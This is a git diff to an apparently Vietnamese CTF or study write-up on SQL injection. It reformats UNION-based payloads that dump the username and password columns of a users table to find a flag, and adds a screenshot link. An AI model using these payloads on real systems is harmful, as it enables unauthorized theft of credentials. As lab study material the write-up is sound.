@@ -13,8 +13,12 @@ Sau đó test thử payload với column = 2 để kiểm tra lỗ hổng => pay
 ![id](https://github.com/tinasahara1/Study/blob/e159b1e37be66b1d5835208db76e3c848dc67e5b/WebSec/image/id3.PNG)
 
 Đầu ra cho thấy cả 2 column 1,2 đều lỗi => Ta group_concat(username) để tìm flag thử 
-`1 union select 1,group_concat(username) from users;`
-![id]()
+```sql
+1 union select 1,group_concat(username) from users;
+```
+![id](https://github.com/tinasahara1/Study/blob/3bcf48f054953d8366acef0111ed71c7239dc71f/WebSec/image/id_flag.PNG)
 
-Nhưng vẫn không thấy
-`1 union select 1,group_concat(password) from users;`
+Nhưng vẫn không thấy ta thử tiếp phần password và tìm thấy flag :
+```sql
+1 union select 1,group_concat(password) from users;
+```
